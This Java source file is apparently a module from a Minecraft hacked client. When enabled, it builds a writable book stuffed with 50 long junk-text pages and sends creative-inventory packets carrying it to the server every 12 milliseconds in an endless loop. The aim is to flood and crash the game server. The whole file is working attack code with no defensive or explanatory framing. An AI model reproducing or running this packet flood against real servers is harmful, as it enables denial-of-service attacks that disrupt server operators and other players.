package zelix.hack.hacks;

import zelix.hack.*;
import zelix.utils.hooks.visual.*;
import net.minecraft.init.*;
import net.minecraft.item.*;
import zelix.utils.*;
import net.minecraft.nbt.*;
import net.minecraft.network.play.client.*;
import net.minecraft.network.*;

public class AttackPacketCIA extends Hack
{
    public AttackPacketCIA() {
        super("AttackPacketCIA", HackCategory.ANOTHER);
    }
    
    @Override
    public String getDescription() {
        return "Attack packets 'CPacketCreativeInventoryAction' on server.";
    }
    
    @Override
    public void onEnable() {
        new Thread() {
            @Override
            public void run() {
                try {
                    ChatUtils.warning("Attack...");
                    final ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
                    final NBTTagList list = new NBTTagList();
                    final NBTTagCompound tag = new NBTTagCompound();
                    final String author = Wrapper.INSTANCE.mc().getSession().getUsername();
                    final String title = "Title";
                    final String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                    for (int i = 0; i < 50; ++i) {
                        final String siteContent = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                        final NBTTagString tString = new NBTTagString("wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5");
                        list.appendTag((NBTBase)tString);
                    }
                    tag.setString("author", author);
                    tag.setString("title", "Title");
                    tag.setTag("pages", (NBTBase)list);
                    bookObj.setTagInfo("pages", (NBTBase)list);
                    bookObj.setTagCompound(tag);
                    while (true) {
                        Wrapper.INSTANCE.sendPacket((Packet)new CPacketCreativeInventoryAction(36, bookObj));
                        Thread.sleep(12L);
                    }
                }
                catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }.start();
        this.setToggled(false);
        super.onEnable();
    }
}
